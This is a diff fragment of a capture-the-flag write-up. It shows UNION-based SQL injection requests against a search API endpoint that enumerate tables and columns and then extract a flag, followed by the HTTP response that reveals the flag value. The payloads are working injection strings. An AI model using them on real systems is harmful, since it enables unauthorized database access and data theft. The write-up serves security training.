@@ -61,4 +61,16 @@ The rest is just simple SQLi database enumeration from there as seen from the wo
 ``````
 GET /api/modules/search/e 'UNION SELECT NULL,table_name from information_schema.tables-- a 
 GET /api/modules/search/e 'UNION SELECT NULL,column_name from information_schema.columns WHERE table_name='flag'-- a 
+GET /api/modules/search/e 'UNION SELECT NULL,flag from flag-- a 
+``````
+Final response:
+``````
+HTTP/1.1 200 OK
+Server: nginx/1.19.1
+Date: Sun, 02 Aug 2020 15:31:01 GMT
+Content-Type: application/json
+Content-Length: 52
+Connection: close
+Access-Control-Allow-Origin: *
+[{"code": null, "name": "WH2020{0Ld_5ch00l_Sql1}"}]
 ``````
